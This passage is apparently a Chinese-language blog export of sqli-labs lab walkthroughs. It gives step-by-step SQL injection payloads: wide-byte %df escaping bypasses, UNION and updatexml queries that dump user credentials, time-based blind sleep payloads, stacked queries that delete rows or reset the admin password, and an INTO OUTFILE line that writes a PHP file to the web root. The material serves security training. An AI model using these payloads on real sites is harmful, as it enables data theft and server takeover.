<li><p>测试并判断注入类型<br>和之前的32，33关差别不大，但是这回是POST提交方式<br>因为在url栏中输入 %df 主要是以 16进制形式输入，而在输入框输入 %df 则是以普通字符串输入的。<br>所以我们需要略作改变<br>绕过方法：有些汉字的编码为三个字节的编码，我们将三个字节拆开来看，前两个为一组，后面的那个和 \ 相编码为两字节绕过，从而使得单引号逃逸</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; order by 3 #</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; union select 1,2 #</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; union select version(),database() #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; union select 1,table_name from information_schema.tables where table_schema= database() limit 3,1 #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">汉&#x27; union select 1,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第2种"><a href="#第2种" class="headerlink" title="第2种"></a>第2种</h2><ol>
<li><p>测试并判断注入类型<br>既然在输入栏不能直接输入，我们可以通过burp抓包来注入。</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; order by 3 #</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; union select 1,2 #</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; union select version(),database() #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; union select 1,table_name from information_schema.tables where table_schema= database() limit 3,1 #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df&#x27; union select 1,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="burp注入的另一种方案，在Hex栏修改16进制注入为df。"><a href="#burp注入的另一种方案，在Hex栏修改16进制注入为df。" class="headerlink" title="burp注入的另一种方案，在Hex栏修改16进制注入为df。"></a>burp注入的另一种方案，在Hex栏修改16进制注入为df。</h3><p>可参见：<a href="https://blog.csdn.net/m0_62879498/article/details/122558222">sql-lab (32~35)包含对 宽字节注入的原理理解及注意事项</a><br>虽然不算很实用的方法，但也不失为一种有趣的思路。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>稍微改了个形式罢了，不足挂齿</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_41420747/article/details/81836327">sqli-lab教程——1-35通关Writeup</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_35</title>
    <url>/2022/11/18/sqli-labs_35/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>题目的提示已经很明显了</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
<p>通过这段源码，我们可以知道，id没有被单引号括起来所以addslashes起不到作用<br>直接payload即可</p>
</li>
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 order by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,2,(select group_concat(username,0x3a,password) from users) #</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>看破陷阱后，其实很简单</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_36+37</title>
    <url>/2022/11/18/sqli-labs_36+37/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这关基本是在重复之前的注入方式</p>
<span id="more"></span>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
<li>测试并判断注入类型<br>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>= <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
我们可以注意到这里有个mysql_real_escape_string()函数<br>下列字符受影响：</li>
</ol>
<ul>
<li>\x00</li>
<li>\n</li>
<li>\r</li>
<li>\</li>
<li>’</li>
<li>“</li>
<li>\x1a<br>那么直接用%df绕过</li>
</ul>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1%df&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1%df&#x27; union select 1,2,(select group_concat(username,0x3a,password) from users)--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="第37关"><a href="#第37关" class="headerlink" title="第37关"></a>第37关</h1><p>和第34关差不多，这一关网上有说按第34关第1种方法能成功，但我没成功<br>因此我选择第2种，使用burp抓包注入。</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>毫无难度</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_38-41</title>
    <url>/2022/11/18/sqli-labs_38-41/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关又可以学到新的注入方式–堆叠注入。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li>测试并判断注入类型<br>首先查看源码，发现这样一条语句<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>)</span><br></pre></td></tr></table></figure>
mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用分号分隔的SQL语句。<br>详细可见：<a href="https://www.php.net/manual/zh/mysqli.multi-query.php#:~:text=mysqli_multi_query%20%28mysqli%20%24link%2C%20string%20%24query%29%3A%20bool%20%E6%89%A7%E8%A1%8C%E4%B8%80%E4%B8%AA%20SQL,%E8%AF%AD%E5%8F%A5%E3%80%82%20%E8%A6%81%E8%8E%B7%E5%BE%97%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E4%B8%AD%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%BB%93%E6%9E%9C%E9%9B%86%EF%BC%8C%E8%AF%B7%E4%BD%BF%E7%94%A8%20mysqli_use_result%20%28%29%20%E6%88%96%20mysqli_store_result%20%28%29%20%E5%87%BD%E6%95%B0%E3%80%82">mysqli_multi_query</a></li>
</ol>
<p>那么，当我们看到这条语句时，就可以注意能否使用<strong>堆叠注入</strong>了。<br>所谓堆叠注入，简单地说，是能够同时注入多条语句。<br>实际遇到很少，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
<ol start="2">
<li><p>猜解SQL查询语句中的字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>爆出显示位</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,version(),database() --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database()) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)  --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,(select group_concat(username,0x3a,password) from users)--+</span><br></pre></td></tr></table></figure>
</li>
<li><p>增删改<br>这里示例一个增，也即为插入数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; ;insert into users(id,username,password)values(100,&#x27;772211&#x27;,&#x27;112277&#x27;);</span><br><span class="line">?id=100</span><br></pre></td></tr></table></figure>
<p>先后输入这两条语句，可以看到插入成功<br>示例一个删</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;) ;delete from users where id=1;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第39关"><a href="#第39关" class="headerlink" title="第39关"></a>第39关</h2><p>与第38关相比差不多，只不过第39关不需要单引号</p>
<h2 id="第40关"><a href="#第40关" class="headerlink" title="第40关"></a>第40关</h2><p>与第38关相比差不多，只不过第40关的闭合方式是’)</p>
<h2 id="第41关"><a href="#第41关" class="headerlink" title="第41关"></a>第41关</h2><p>与38关差不多，也可堆叠注入</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>冲冲冲</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/qq_45691294/article/details/107376284">SQL注入之堆叠注入</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_4</title>
    <url>/2022/11/08/sqli-labs_4/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>和第3关其实是同种类型</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1”后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_4.png" alt="报错信息"></p>
</li>
<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘“1””) LIMIT 0,1’ at line 1<br>可知，sql语句是双引号字符型且有括号。<br>所以我们也需要闭合双引号和括号。<br>则构造语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=2&quot;)--+</span><br></pre></td></tr></table></figure></li>
</ol>
<p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p>
<ol start="3">
<li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;) order by 3--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li>
<li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
<li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul>
<li>此笔记为笔者初学sql注入时所写</li>
<li>本关重点在于通过报错信息判断sql语句，注意sql语句的构造情况</li>
</ul>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_42-45</title>
    <url>/2022/11/19/sqli-labs_42-45/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>周末学习的开始</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型<br>查看源码，在login.php中注意到这样的语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br></pre></td></tr></table></figure>
<p>我们可以发现，username被过滤了，但是password没有被过滤<br>因此我们可以考虑从password处进行注入<br>然后，通过对堆叠注入的尝试，我们发现也是可行的。<br>于是，我们可以有两种方式。<br>一是常规方式，二是通过堆叠注入修改管理员密码从而登录</p>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password),2 from users #</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改管理员密码(可以直接做)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;update users set password=&#x27;111111&#x27;  where username=&#x27;admin&#x27;#</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第43关"><a href="#第43关" class="headerlink" title="第43关"></a>第43关</h2><p>与第42关差不多，只不过闭合方式为’)</p>
<h2 id="第44关"><a href="#第44关" class="headerlink" title="第44关"></a>第44关</h2><p>与第42关差不多，只是不能使用报错注入</p>
<h2 id="第45关"><a href="#第45关" class="headerlink" title="第45关"></a>第45关</h2><p>与第43关差不多，只是闭合方式为’)</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>向前走,不回头~</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/qq_43395215/article/details/108245668">sqli-labs(38-53)</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_46+47</title>
    <url>/2022/11/19/sqli-labs_46+47/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前面连续几关相似，这一回终于有新内容了。</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1</span><br></pre></td></tr></table></figure>
<p>显示有id,username,password的表格<br>可以直接得到需要的信息，但在实际情况中，这样是不够的。<br>也可以倒序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 desc</span><br></pre></td></tr></table></figure>
<p>这里可用的注入方式很多<br>报错注入，时间盲注，双查询注入，函数注入<br>下面以报错注入为例</p>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,database(),0x7e),1)</span><br><span class="line">?sort=-1 and updatexml(1,concat(0x7e,version(),0x7e),1)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1),0x7e),1)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1),0x7e),1)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and updatexml(1,concat(0x7e,(select concat_ws(username,&#x27;:&#x27;,password) from users limit 0,1),0x7e),1)</span><br></pre></td></tr></table></figure>
</li>
<li><p>写入查询记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=1 into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-46\\111.php&quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e2020--+</span><br></pre></td></tr></table></figure>
<p>用十六进制代替<?php phphinfo();?></p>
</li>
</ol>
<h2 id="第47关"><a href="#第47关" class="headerlink" title="第47关"></a>第47关</h2><p>与第46关相比差不多，只是闭合方式为’</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>有些时候注入的方式不止一种，我们只需选择自己最擅长以及最迅速有效的方法即可</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">sqli-labs大详解（完结）</a><br><a href="https://blog.csdn.net/qq_43395215/article/details/108245668">sqli-labs(38-53)</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_48-53</title>
    <url>/2022/11/19/sqli-labs_48-53/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>久违的盲注</p>
<span id="more"></span>
<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>测试并判断注入类型</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;   无信息，只知道出错</span><br></pre></td></tr></table></figure>
<p>可以发现，现在无法使用报错注入了<br>那我们就要用到久违的盲注了。</p>
</li>
<li><p>获取当前数据库名和数据库版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if((ascii(substr(database(),1,1))=115),sleep(10),1) --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1);--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substring((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database()) limit 0,1),1,1))=101,sleep(10),1);--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1);--+</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="第49关"><a href="#第49关" class="headerlink" title="第49关"></a>第49关</h2><p>与第48关相比差不多，只是闭合方式为’</p>
<h2 id="第50关"><a href="#第50关" class="headerlink" title="第50关"></a>第50关</h2><p>与第48关相比差不多，因为源码中存在mysqli_multi_query,可以堆叠注入</p>
<h2 id="第51关"><a href="#第51关" class="headerlink" title="第51关"></a>第51关</h2><p>与第50关相比差不多，只是闭合方式为’</p>
<h2 id="第52关"><a href="#第52关" class="headerlink" title="第52关"></a>第52关</h2><p>与第50关相比差不多</p>
<h2 id="第53关"><a href="#第53关" class="headerlink" title="第53关"></a>第53关</h2><p>与第51关相比差不多</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>常规操作</p>
<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">sqli-labs大详解（完结）</a></p>
]]></content>
      <categories>
        <category>SQL注入</category>
        <category>sqli-labs</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>sqli-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs_5+6</title>
    <url>/2022/11/08/sqli-labs_5+6/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第5，6关基本一致，区别只在于单引号和双引号，因此放在一起了。这两关的关键点在于：正确时不返回结果，错误时有报错信息。因此综合判断之下，使用报错注入的方式最好。</p>
<span id="more"></span>

<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
<li><p>判断是否存在<strong>SQL注入</strong><br>和前几关一致，这里不过多阐述。<br>输入?id&#x3D;1”有报错信息。<br>报错信息为：<br><img src="/simg/sqli-labs_6.png" alt="sqli-labs_6输入?id=1&quot;时的报错信息"></p>
</li>
<li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由报错信息near ‘“1”” LIMIT 0,1’ at line 1可知是双引号字符型。<br>构造语句?id&#x3D;1”–+</p>
</li>
<li><p>猜解SQL查询语句中的<strong>字段数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure>
<p>可得字段数为3</p>
</li>
<li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由于无法返回正常信息，所以不能使用union联合查询<br>使用报错注入常用的函数即可（<a href="https://truthnian.github.io/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">常用函数</a>）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(database(),0x7e,version())),0x23),1)--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>爆字段名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure>
<p>因为updatexml()函数最多只能显示32个字符，无法显示到所需的数据，所以不能只写where table_name&#x3D;’users’  应该再加一个限定到当前数据库。</p>
</li>
<li><p><strong>爆数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x23),1)--+</span><br></pre></td></tr></table></figure>
